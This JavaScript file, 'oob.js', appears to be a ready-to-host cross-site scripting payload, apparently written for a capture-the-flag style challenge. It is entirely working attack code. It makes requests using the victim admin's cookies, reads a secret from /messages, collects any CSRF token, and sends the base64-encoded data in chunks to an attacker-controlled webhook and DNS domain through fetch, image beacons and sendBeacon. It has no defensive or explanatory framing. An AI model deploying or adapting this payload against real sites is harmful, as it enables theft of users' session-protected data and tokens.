// oob.js - host remotely (GitHub+jsDelivr). Replace EXFIL_HTTP and EXFIL_DOMAIN.
(async function() {
  const EXFIL_HTTP = "https://your-beeceptor-or-webhook"; // e.g. https://skavens.free.beeceptor.com
  const EXFIL_DOMAIN = "oob.yourdomain.com"; // optional, if you control a domain for DNS exfil; otherwise set null
  const CHUNK = 900; // conservative chunk size for URL-length safety

  function b64u(s){
    return btoa(unescape(encodeURIComponent(s)));
  }
  function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }

  // find common CSRF tokens in DOM and meta
  function findCsrf(){
    try{
      const metas = document.querySelectorAll('meta[name*="csrf" i], meta[id*="csrf" i]');
      if(metas && metas.length) return metas[0].content;
      const inputs = document.querySelectorAll('input[name*="csrf" i], input[id*="csrf" i]');
      if(inputs && inputs.length) return inputs[0].value;
    }catch(e){}
    return null;
  }

  async function tryExfilHTTP(path){
    // try fetch with no-cors (will fire but response unreadable)
    try{
      fetch(EXFIL_HTTP + path, { mode: "no-cors", keepalive: true });
      return true;
    }catch(e){}
    // try create Image
    try{ (new Image()).src = EXFIL_HTTP + path; return true; }catch(e){}
    return false;
  }

  async function trySendBeacon(path, data){
    try{
      const url = EXFIL_HTTP + path;
      if(navigator.sendBeacon){
        const blob = new Blob([data], {type:'application/octet-stream'});
        navigator.sendBeacon(url, blob);
        return true;
      }
    }catch(e){}
    return false;
  }

  async function tryDnsExfil(prefix){
    if(!EXFIL_DOMAIN) return false;
    try{
      // create element src pointing to subdomain containing chunk
      const i = new Image();
      i.src = "https://" + encodeURIComponent(prefix) + "." + EXFIL_DOMAIN + "/x.png";
      return true;
    }catch(e){}
    return false;
  }

  try{
    // optionally cause server-side visit (uncomment if needed and adapt body)
    try{
      // change body if the /visit endpoint expects different params
      await fetch("/visit", { method: "POST", credentials: "include", headers: {"Content-Type":"application/x-www-form-urlencoded"}, body: "id=1" });
      await sleep(300);
    }catch(e){ /* ignore */ }

    // fetch the secret as admin
    let resp;
    try {
      resp = await fetch("/messages?id=1", { method: "GET", credentials: "include" });
    } catch(e) {
      // fallback: sometimes endpoint uses POST
      try {
        resp = await fetch("/messages", { method: "POST", credentials: "include", headers: {"Content-Type":"application/json"}, body: JSON.stringify({id:1}) });
      } catch (e2) {
        resp = null;
      }
    }
    let txt = "";
    if(resp){
      try { txt = await resp.text(); }
      catch(e){ txt = ""; }
    }

    // include the page path & possible csrf token meta location to help debugging
    const meta = { from: location.pathname + location.search, csrf: findCsrf() || null };
    const payload = JSON.stringify({ meta: meta, body: txt });

    const encoded = b64u(payload);

    // split into URL-friendly chunks
    const chunks = [];
    for(let i=0;i<encoded.length;i+=CHUNK) chunks.push(encoded.slice(i,i+CHUNK));

    // send header with number of chunks via HTTP + beacon + DNS if possible
    const header = "/_h/" + encodeURIComponent(location.hostname + location.pathname) + "/" + chunks.length + "/";
    await tryExfilHTTP(header);
    await trySendBeacon(header, header);
    await tryDnsExfil("hdr-" + b64u(location.hostname+location.pathname).slice(0,60));

    // send each chunk using multiple methods; stop trying methods per-chunk only after one succeeded
    for(let idx=0; idx<chunks.length; idx++){
      const c = chunks[idx];
      const path1 = "/" + idx + "/" + encodeURIComponent(c);
      // try HTTP GETs (no-cors) and Image
      await tryExfilHTTP(path1);
      // try sendBeacon
      await trySendBeacon("/beacon/" + idx, c);
      // try DNS subdomain (prefix limit - only use part)
      await tryDnsExfil("p" + idx + "-" + c.slice(0,50));
      await sleep(120);
    }
  }catch(e){
    // best-effort error report
    try{ await tryExfilHTTP("/_err/" + encodeURIComponent(String(e))); }catch(e2){}
  }
})();

